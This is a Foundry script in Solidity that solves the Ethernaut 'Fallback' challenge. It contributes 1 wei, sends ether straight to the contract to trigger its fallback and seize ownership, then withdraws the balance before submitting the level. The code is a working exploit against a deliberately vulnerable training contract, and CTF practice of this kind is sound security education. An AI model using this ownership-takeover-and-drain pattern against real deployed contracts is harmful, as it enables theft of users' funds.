// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
interface IFallback {
    function contribute() external payable;
    function getContribution() external;
    function withdraw() external;
}

contract FallbackSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);
        
        IFallback(challengeInstance).contribute{value: 1 wei}();
        (bool success, ) = challengeInstance.call{value: 1 wei}("");
        require(success, "Transfer Failed");
        IFallback(challengeInstance).withdraw();

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(1));
    }
}
